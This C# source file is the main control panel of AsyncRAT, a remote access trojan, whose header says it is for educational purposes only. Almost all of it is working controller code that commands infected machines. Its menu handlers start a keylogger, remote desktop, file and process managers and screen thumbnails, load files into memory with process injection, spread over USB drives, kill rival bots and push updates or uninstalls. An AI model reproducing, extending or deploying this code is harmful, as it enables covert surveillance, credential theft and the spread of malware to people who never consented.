using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using AsyncRAT_Sharp.Forms;
using AsyncRAT_Sharp.Cryptography;
using System.Diagnostics;
using System.Net.Sockets;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace AsyncRAT_Sharp
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            CheckFiles();
            InitializeComponent();
            this.Opacity = 0;
        }

        private Listener listener;
        private bool trans;

        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                {
                   File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
                    Process.Start(Application.ExecutablePath);
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "cGeoIp.dll")))
                    MessageBox.Show("File 'cGeoIp.dll' Not Found!");

                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    MessageBox.Show("Stub Not Found!");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}";
#if DEBUG
            Settings.Port = "6606";
            Settings.Password = "NYAN CAT";
            Settings.AES = new Aes256(Settings.Password);
#else
            using (FormPorts portsFrm = new FormPorts())
            {
                portsFrm.ShowDialog();
                Settings.Port = portsFrm.textPorts.Text;
                Settings.Password = portsFrm.textPassword.Text;
                Settings.AES = new Aes256(Settings.Password);
            }
#endif


            await Methods.FadeIn(this, 5);
            trans = true;

            await Task.Run(() => Connect());
        }

        private void Connect()
        {
            try
            {
                string[] ports = Settings.Port.Split(',');
                foreach (var port in ports)
                {
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        listener = new Listener();
                        Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.ToString().Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem itm in listView1.Items)
                {
                    Clients client = (Clients)itm.Tag;
                    ThreadPool.QueueUserWorkItem(client.Ping);
                }
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
            toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
        }

        private void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "close";
                foreach (ListViewItem itm in listView1.SelectedItems)
                {
                    Clients client = (Clients)itm.Tag;
                    ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                }
            }
        }

        private void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(Msgbox))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "sendMessage";
                    msgpack.ForcePathObject("Message").AsString = Msgbox;
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
        }

        private async void sENDFILEToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog openFileDialog = new OpenFileDialog();
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        msgpack.ForcePathObject("Update").AsString = "false";
                        foreach (ListViewItem itm in listView1.SelectedItems)
                        {
                            Clients client = (Clients)itm.Tag;
                            client.LV.ForeColor = Color.Red;
                            foreach (string file in openFileDialog.FileNames)
                            {
                                await msgpack.ForcePathObject("File").LoadFileAsBytes(file);
                                msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "uninstall";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void RESTARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "restart";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private async void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog openFileDialog = new OpenFileDialog();
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        await msgpack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                        msgpack.ForcePathObject("Update").AsString = "true";
                        foreach (ListViewItem itm in listView1.SelectedItems)
                        {
                            Clients client = (Clients)itm.Tag;
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    FormSendFileToMemory formSend = new FormSendFileToMemory();
                    formSend.ShowDialog();
                    if (formSend.toolStripStatusLabel1.Text.Length > 0 && formSend.toolStripStatusLabel1.ForeColor == Color.Green)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendMemory";
                        msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString()));
                        if (formSend.comboBox1.SelectedIndex == 0)
                        {
                            msgpack.ForcePathObject("Inject").AsString = "";
                            msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
                        }
                        else
                        {
                            msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
                        }

                        foreach (ListViewItem itm in listView1.SelectedItems)
                        {
                            Clients client = (Clients)itm.Tag;
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                    formSend.Close();
                    formSend.Dispose();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Quality").AsInteger = 60;
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                            if (remoteDesktop == null)
                            {
                                remoteDesktop = new FormRemoteDesktop
                                {
                                    Name = "RemoteDesktop:" + client.ID,
                                    F = this,
                                    Text = "RemoteDesktop:" + client.ID,
                                    C = client,
                                    Active = true
                                };
                                remoteDesktop.Show();
                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }

        }

        private void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "processManager";
                    msgpack.ForcePathObject("Option").AsString = "List";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormProcessManager processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                            if (processManager == null)
                            {
                                processManager = new FormProcessManager
                                {
                                    Name = "processManager:" + client.ID,
                                    Text = "processManager:" + client.ID,
                                    F = this,
                                    C = client
                                };
                                processManager.Show();
                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormBuilder formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }

        private void fILEMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                            if (fileManager == null)
                            {
                                fileManager = new FormFileManager
                                {
                                    Name = "fileManager:" + client.ID,
                                    Text = "fileManager:" + client.ID,
                                    F = this,
                                    C = client
                                };
                                fileManager.Show();
                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KEYLOGGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                    msgpack.ForcePathObject("isON").AsString = "true";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                            if (KL == null)
                            {
                                KL = new FormKeylogger
                                {
                                    Name = "keyLogger:" + client.ID,
                                    Text = "keyLogger:" + client.ID,
                                    F = this,
                                    C = client
                                };
                                KL.Show();
                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void BOTKILLERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "botKiller";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void USBSPREADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "usbSpread";
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void VISITWEBSITEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    string url = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
                    if (string.IsNullOrEmpty(url))
                        return;
                    else
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "visitURL";
                        msgpack.ForcePathObject("URL").AsString = url;
                        foreach (ListViewItem itm in listView1.SelectedItems)
                        {
                            Clients client = (Clients)itm.Tag;
                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                }
                catch { }
            }
        }

        private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormAbout formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (trans)
                this.Opacity = 1.0;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.95;
        }

        private static System.Threading.Timer Tick { get; set; }
        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Tick != null && listView1.Items.Count > 0)
            {
                Tick = new System.Threading.Timer(new TimerCallback(GetThumbnails), null, 2500, 5000);
            }
        }
        private void GetThumbnails(object obj)
        {
            if (listView1.Items.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "thumbnails";

                    foreach (ListViewItem itm in listView1.Items)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch { }
            }
        }

        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Tick?.Dispose();
                listView3.Items.Clear();
                imageList1.Images.Clear();
                foreach (ListViewItem itm in listView1.Items)
                {
                    Clients client = (Clients)itm.Tag;
                    client.LV2 = null;
                }
            }
            catch { }
        }

        private void NotificationOFFToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (notificationOFFToolStripMenuItem.Text.Contains("[ON]"))
            {
                notificationOFFToolStripMenuItem.Text = "Notification is currently [OFF]";
                Properties.Settings.Default.Notification = false;
            }
            else
            {
                notificationOFFToolStripMenuItem.Text = "Notification is currently [ON]";
                Properties.Settings.Default.Notification = true;
            }
            Properties.Settings.Default.Save();
        }
    }
}